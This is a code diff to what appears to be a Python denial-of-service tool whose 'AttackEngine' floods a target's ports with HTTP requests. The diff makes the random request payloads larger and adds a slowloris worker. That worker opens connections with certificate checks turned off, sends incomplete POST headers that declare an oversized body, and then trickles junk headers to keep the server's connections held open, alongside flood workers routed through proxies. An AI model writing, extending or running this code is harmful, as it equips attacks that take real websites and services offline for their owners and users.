@@ -37,7 +37,7 @@ def _h():
             "Cache-Control": "no-cache", "Connection": "keep-alive"}
 
 def _p():
-    return {_j(5, 10): _j(100, 500) for _ in range(random.randint(1, 3))}
+    return {_j(5, 10): _j(5000, 15000) for _ in range(random.randint(3, 8))}
 
 def _m(m):
     return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value
@@ -115,7 +115,7 @@ class AttackEngine:
         self.stats = self.stats.snapshot()
 
     async def _port_loop(self, target, port, method, num_workers, deadline, use_proxies):
-        """Spawn N continuous workers per port — each loops independently."""
+        """Spawn N continuous workers + slowloris per port."""
         base = _url(target, port)
         d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
         p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
@@ -123,12 +123,22 @@ class AttackEngine:
         d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
         d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
+        # 80% flood workers, 20% slowloris connections
+        flood_count = int(num_workers * 0.8)
+        slow_count = num_workers - flood_count
+
         workers = []
-        for i in range(num_workers):
-            # 30% direct, 70% proxy (if proxies alive)
+        for i in range(flood_count):
             use_px = use_proxies and (i % 10 >= 3)
             workers.append(asyncio.create_task(
                 self._worker(d_session, base, port, method, deadline, use_px, p_timeout)))
+
+        # Slowloris workers
+        parsed = urlparse(target)
+        host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
+        for _ in range(slow_count):
+            workers.append(asyncio.create_task(
+                self._slowloris_worker(host, port, deadline)))
 
         try:
             await asyncio.gather(*workers, return_exceptions=True)
@@ -156,6 +166,56 @@ class AttackEngine:
                     await self._fire_direct(d_session, base, port, method)
             except Exception:
                 pass
+
+    async def _slowloris_worker(self, host, port, deadline):
+        """Open TCP connection and send partial HTTP headers very slowly."""
+        ssl_ctx = False
+        while not self._stop.is_set():
+            if deadline and time.time() >= deadline:
+                break
+            ps = self.stats.ports.get(port)
+            if not ps or ps.status != PortStatus.ALIVE:
+                await asyncio.sleep(1)
+                continue
+            try:
+                if port in (443, 8443, 4443, 3443, 5443, 9443, 10443):
+                    import ssl as _ssl
+                    ssl_ctx = _ssl.create_default_context()
+                    ssl_ctx.check_hostname = False
+                    ssl_ctx.verify_mode = _ssl.CERT_NONE
+
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=5)
+
+                # Send partial HTTP request header
+                writer.write(f"POST /?{_j(5,10)}={_j(10,20)} HTTP/1.1\r\n".encode())
+                writer.write(f"Host: {host}\r\n".encode())
+                writer.write(f"User-Agent: {random.choice(UA)}\r\n".encode())
+                writer.write(f"Content-Length: {random.randint(100000, 500000)}\r\n".encode())
+                writer.write(b"Content-Type: application/x-www-form-urlencoded\r\n")
+                writer.write(f"Accept: */*\r\n".encode())
+                await writer.drain()
+
+                # Keep connection alive by sending one header byte every few seconds
+                for _ in range(random.randint(30, 120)):
+                    if self._stop.is_set():
+                        break
+                    writer.write(f"X-{_j(5,8)}: {_j(10,20)}\r\n".encode())
+                    await writer.drain()
+                    ps.total_requests += 1
+                    self.stats.total_requests += 1
+                    ps.successful += 1
+                    self.stats.successful += 1
+                    await asyncio.sleep(random.uniform(1, 3))
+
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                ps.total_requests += 1
+                ps.failed += 1
+                self.stats.total_requests += 1
+                self.stats.failed += 1
+                await asyncio.sleep(0.5)
 
     async def _fire_direct(self, session, base, port, method):
         ps = self.stats.ports.get(port)
